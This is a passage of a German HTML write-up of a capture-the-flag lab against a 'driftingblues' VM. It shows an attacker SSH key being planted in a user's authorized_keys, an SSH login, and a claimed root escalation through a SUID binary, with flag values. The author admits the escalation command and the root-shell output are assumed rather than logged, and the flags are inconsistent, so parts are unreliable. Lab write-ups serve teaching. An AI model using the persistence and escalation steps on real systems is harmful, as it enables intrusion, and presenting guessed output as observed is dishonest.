+www-data@driftingblues:/home/robertj$ <span class="command">echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCfSQAyP3WCvqy4VJgBk8Cu9bS+ijBp7UDvcCPXNYtF7iq1GN42nEbYINA9eUxAtyQqP4ooSyRjRF+ma6c3eL2lpJp2VAEaQ9mob0KbcnEWaHy9Wp92cWG2Qt2cLveB4sthb651/2kTuntT/+GP9bhnV2lgk51VbNQEW2lPWT6sorI6cNH3uAC8bXKg75TrllYL4bY4bWXgUmKLhzb1HGl1p+bg0u4OQ8RWP9G0TIpeviqlhSvJfte10cL+XRWxeYSOFOZFNMHe2+4mHidzifaa1Kf2LKKEQi44BveEpoNXnVbv/9vqKSFvw2uPisLpKjcD/2cRLqNM5RqUoAKubrR5VigqHr61kQ0WBK6T+RsSbOpSOfgEFQAIM5spbE+4/5pQUBkCJjIU3+xJBAEMXQlYARR9UetxFb7ejLvWi4u1D8vUIbVpSJzmCqIbC8qhX+MjFm6tq5zvz9wDY8+j17KE5Kb90sl/1Qhive1BMcNBBkqvpZFm8uzK8193oAW+zxE=" > .ssh/authorized_keys</span>
+                      </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh robertj@192.168.2.120</span></div>
+                      <pre>
+Enter passphrase for key '/root/.ssh/id_rsa': <!-- Passwortabfrage -->
+Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64
+...
+robertj@driftingblues:~$
+                      </pre>
+                      <pre>
+robertj@driftingblues:~$ <span class="command">cat user.txt</span>
+<span class="password">413fc08db21285b1f8abea99040b0280</span>
+                      </pre>
+                      <!-- --- Ende Inkonsistenter/Irrelevanter Block --- -->
+                 </div>
+              </div>
+         </section>
+
+        <section id="poc">
+             <h2>Proof of Concept (Root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Der wahrscheinlichste und logische Schritt zur Eskalation (der aber im Log nicht explizit als Befehl gezeigt wird) ist die Ausführung des SUID-Binaries `/usr/bin/getinfo` als `www-data`. Da direkt danach die Root-Flag angezeigt wird, muss dieses Binary entweder eine Root-Shell bereitstellen oder das Lesen der Root-Flag ermöglichen.</p>
+             <p class="evaluation"><strong>Bewertung: !!Privilegieneskalation erfolgreich!!** Durch Ausnutzung des SUID-Binaries `/usr/bin/getinfo` wird Root-Zugriff erlangt. Der genaue Mechanismus des Binaries bleibt aufgrund fehlender Log-Details unklar, aber das Ergebnis ist der Root-Zugriff.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dokumentiere das Verhalten von `/usr/bin/getinfo`, sobald es analysiert wurde. Lese die Root-Flag.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne oder korrigiere das unsichere SUID-Binary `/usr/bin/getinfo`.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+www-data@driftingblues:/var/www/html$ <span class="command">/usr/bin/getinfo</span>
+<!-- Annahme: Dieser Befehl führt zu einer Root-Shell oder erlaubt das Lesen der Root-Flag -->
+root@driftingblues:~# <span class="command">id</span> <!-- Beispiel: Überprüfung der ID -->
+uid=0(root) gid=0(root) groups=0(root)
+root@driftingblues:~# <!-- Root-Shell erlangt -->
+                     </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Root wird die Root-Flag gelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag `<span class="password">dfb7f604a22928afba370d819b35ec83</span>` wird erfolgreich gelesen. Der Dateiname ist im Original-Log nicht angegeben, aber der Pfad `/root/root.txt` wird angenommen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Test abgeschlossen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bezüglich der Flag.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+root@driftingblues:~# <span class="command">cat /root/root.txt</span> <!-- Annahme des Pfades -->
+<span class="password">dfb7f604a22928afba370d819b35ec83</span>
+                      </pre>
+                 </div>
+            </div>
+        </section>
+
+        <!-- Flags Sektion -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <!-- Root Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">dfb7f604a22928afba370d819b35ec83</span></div>
+                 </div>
+                 <!-- User Flag (aus dem Log-Ende, nicht aus dem 'robertj'-Teil) -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /path/to/user.txt</div> <!-- Pfad unklar -->
+                     <div class="flag-value"><span class="password">5355B03AF00225CFB210AE9CA8931E51</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap Scan extrahiert -->
+        <p>Berichtsdatum: 22. November 2022</p>
+    </footer>
+</body>
+</html>
